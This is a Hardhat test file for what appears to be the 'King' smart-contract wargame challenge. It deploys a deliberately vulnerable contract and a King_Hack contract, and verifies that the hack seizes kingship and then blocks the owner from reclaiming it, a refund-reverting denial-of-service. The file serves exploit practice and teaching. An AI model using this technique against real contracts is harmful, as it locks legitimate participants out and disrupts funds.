require("@nomiclabs/hardhat-waffle");
const { expect } = require("chai");
const { ethers, waffle} = require("hardhat");

describe("E09_King", async function () {
  var owner, provider, challenge, factoryChallenge, factoryHack;

  before(async function() {
    [ owner, user ] = await ethers.getSigners();
    provider = waffle.provider;

    factoryChallenge = await ethers.getContractFactory("King", owner);
    const params = { value: ethers.utils.parseUnits("0.0001", "ether") };
    challenge = await factoryChallenge.deploy(params);
    await challenge.deployed();
    
    factoryHack = await ethers.getContractFactory("King_Hack", user);
    hack = await factoryHack.deploy(challenge.address);
    await hack.deployed();
  });
  it(`Deployment of challenge contract starts with owner as king`, async () => {
    expect(await challenge._king()).is.equal(owner.address);
  });
  it(`Hack contract becomes king by sending more money than original owner`, async () => {
    const params = { value: ethers.utils.parseUnits("0.0002", "ether") };
    await hack.becomeKing(params);
    expect(await challenge._king()).is.equal(hack.address);
  });
  it(`Successful hack prevents original owner from taking king back`, async () => {
    const params = { to: challenge.address, value: ethers.utils.parseUnits("0.0003", "ether")};
    expect(owner.sendTransaction(params)).to.be.revertedWith('Sorry I broke you');
  });  
});